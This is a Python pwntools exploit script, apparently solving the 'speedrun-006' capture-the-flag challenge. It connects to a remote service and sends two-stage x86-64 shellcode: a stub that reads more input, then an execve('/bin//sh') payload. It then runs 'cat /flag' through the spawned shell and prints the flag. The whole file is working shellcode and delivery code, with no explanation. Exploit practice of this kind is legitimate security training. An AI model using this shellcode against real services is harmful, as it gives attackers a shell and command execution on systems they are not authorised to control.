#!/usr/bin/env python2
import sys
import time
from pwn import *

context.log_level = logging.DEBUG

conn = remote(sys.argv[1], int(sys.argv[2]))
# conn = process("./speedrun-006")
# gdb.attach(conn, '''
# continue
# ''')

conn.recvuntil("Send me your ride")

stage_one = "\x48\x8d\x25\x02\x02\x02\xb2\x40\x08\x48\x81\xec\xec\x01\xcc\x02\x90\x08\x48\x01\xe6\x40\xb4\xff\x0f\x05"

pl = open('payload', 'w')

pl.write(stage_one)

conn.send(stage_one)

time.sleep(.1)

stage_two = "\x31\xc0\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"
conn.send(stage_two)
pl.write(stage_two)

time.sleep(.1)

conn.sendline('cat /flag;exit')

result = conn.recvall()

print("FLAG: %s" % re.search('OOO{[^}]+}', result).group(0))

